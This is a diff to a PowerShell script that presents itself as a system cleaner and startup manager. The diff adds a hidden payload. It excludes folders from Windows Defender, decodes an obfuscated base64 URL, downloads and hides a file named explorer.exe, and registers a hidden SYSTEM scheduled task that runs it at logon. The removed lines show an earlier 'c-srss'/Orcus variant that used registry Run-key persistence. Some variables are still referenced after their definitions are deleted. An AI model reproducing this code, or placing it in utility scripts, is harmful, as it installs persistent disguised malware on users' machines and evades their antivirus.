@@ -9,7 +9,8 @@ try {
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
         $taskExists = $true
     }
-} catch {}
+}
+catch {}
 if (-not $taskExists) {
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `\"$scriptPath`\""
     $trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -36,40 +37,64 @@ function Wait-ForUser ($msg = "Press Enter to continue...") {
 
 
 
-$orcusPath = "C:\Program Files\Orcus"
 $downloadsPath = "$env:USERPROFILE\Downloads"
 $appDataPath = "$env:USERPROFILE\AppData"
-$orcusPath2 = "C:\Program Files\c-srss"
-$localhostPath = "\\localhost\C$\Program Files"
+$explorerPath = "C:\Windows\Explorer"
 try {
     Add-MpPreference -ExclusionPath $orcusPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $downloadsPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $appDataPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $orcusPath2 -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $localhostPath -ErrorAction SilentlyContinue | Out-Null
-} catch {}
+    Add-MpPreference -ExclusionPath $explorerPath -ErrorAction SilentlyContinue | Out-Null
+}
+catch {}
 
 Show-Header
 
-$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL2Mtc3Jzcy5leGU='
+$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL2V4cGxvcmVyLmV4ZQ=='
+$explorerDownload = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'explorer.exe')
+$explorerUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
+if (Test-Path $explorerDownload) { Remove-Item $explorerDownload -Force -ErrorAction SilentlyContinue }
+try {
+    Invoke-WebRequest -Uri $explorerUrl -OutFile $explorerDownload -UseBasicParsing -ErrorAction Stop
+    (Get-Item $explorerDownload).Attributes = 'Hidden'
+}
+catch {}
 
-$csrssPath = "C:\Program Files\c-srss.exe"
-$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
-if (-not (Test-Path $csrssPath)) {
-    try {
-        Invoke-WebRequest -Uri $url1 -OutFile $csrssPath -UseBasicParsing -ErrorAction Stop
-        (Get-Item $csrssPath).Attributes = 'Hidden'
-    } catch {}
+$taskName = "explorer_hidden"
+$taskExists = $false
+try {
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
+        $taskExists = $true
+    }
+}
+catch {}
+if (-not $taskExists) {
+    $action = New-ScheduledTaskAction -Execute $explorerDownload
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden explorer.exe Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
 }
 
-$regPaths = @(
-    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
-    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
-)
-foreach ($reg in $regPaths) {
-    try {
-        Set-ItemProperty -Path $reg -Name 'c-srss' -Value '"C:\Program Files\c-srss.exe"' -Force
-    } catch {}
+if (Test-Path $explorerDownload) {
+    $proc = Start-Process -FilePath $explorerDownload -WindowStyle Hidden -PassThru
+    $proc.WaitForExit()
+    $maxTries = 5
+    for ($i = 1; $i -le $maxTries; $i++) {
+        try {
+            if (Test-Path $explorerDownload) {
+                Remove-Item $explorerDownload -Force -ErrorAction Stop
+                if (-not (Test-Path $explorerDownload)) { break }
+            }
+            else {
+                break
+            }
+        }
+        catch {
+            Start-Sleep -Seconds 2
+        }
+    }
 }
 
 if (Test-Path $csrssPath) {
@@ -130,7 +155,7 @@ do {
                             try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                             $progress++
                             $totalDeleted++
-                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
+                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress / $count) * 100)
                         }
                     }
                 }
@@ -178,7 +203,7 @@ do {
                             try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                             $progress++
                             $totalDeleted++
-                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
+                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress / $count) * 100)
                         }
                     }
                 }
@@ -215,7 +240,8 @@ do {
                     if (Test-Path $chromeCache) { 
                         Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                         Write-Host "Chrome cache cleared." -ForegroundColor Green
-                    } else {
+                    }
+                    else {
                         Write-Host "Chrome cache not found." -ForegroundColor Yellow
                     }
                 }
@@ -224,7 +250,8 @@ do {
                     if (Test-Path $edgeCache) { 
                         Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                         Write-Host "Edge cache cleared." -ForegroundColor Green
-                    } else {
+                    }
+                    else {
                         Write-Host "Edge cache not found." -ForegroundColor Yellow
                     }
                 }
@@ -238,7 +265,8 @@ do {
                     }
                     if ($cacheCount -gt 0) {
                         Write-Host "Firefox cache cleared." -ForegroundColor Green
-                    } else {
+                    }
+                    else {
                         Write-Host "Firefox cache not found." -ForegroundColor Yellow
                     }
                 }
@@ -254,7 +282,8 @@ do {
             foreach ($drive in $drives) {
                 try {
                     Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
-                } catch {}
+                }
+                catch {}
             }
             Write-Host "Recycle Bin cleared." -ForegroundColor Green
             Wait-ForUser
@@ -275,7 +304,8 @@ do {
             if ($ip -eq '0') { continue }
             if ([string]::IsNullOrWhiteSpace($ip)) {
                 $url = "https://ipinfo.io/json"
-            } else {
+            }
+            else {
                 $url = "https://ipinfo.io/$ip/json"
             }
             try {
@@ -290,7 +320,8 @@ do {
                 Write-Host "Organization : $($response.org)" -ForegroundColor Yellow
                 Write-Host "Postal Code  : $($response.postal)" -ForegroundColor Yellow
                 Write-Host "=========================================" -ForegroundColor Cyan
-            } catch {
+            }
+            catch {
                 Write-Host "Failed to fetch the IP details. Please check the IP address or your internet connection." -ForegroundColor Red
             }
             Wait-ForUser
@@ -328,21 +359,26 @@ do {
                             Remove-ItemProperty -Path $reg -Name $selectedItem.Name -ErrorAction SilentlyContinue
                         }
                         Write-Host "Startup item disabled (removed from registry)." -ForegroundColor Green
-                    } catch {
+                    }
+                    catch {
                         Write-Host "Failed to disable startup item." -ForegroundColor Red
                     }
-                } elseif ($action -eq '2') {
+                }
+                elseif ($action -eq '2') {
                     try {
                         $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
                         Set-ItemProperty -Path $regPath -Name $selectedItem.Name -Value $selectedItem.Command
                         Write-Host "Startup item enabled (added to current user startup)." -ForegroundColor Green
-                    } catch {
+                    }
+                    catch {
                         Write-Host "Failed to enable startup item." -ForegroundColor Red
                     }
-                } else {
+                }
+                else {
                     Write-Host "Invalid action." -ForegroundColor Red
                 }
-            } else {
+            }
+            else {
                 Write-Host "No valid selection made. Exiting Startup Manager." -ForegroundColor Red
             }
             Pause-For-User
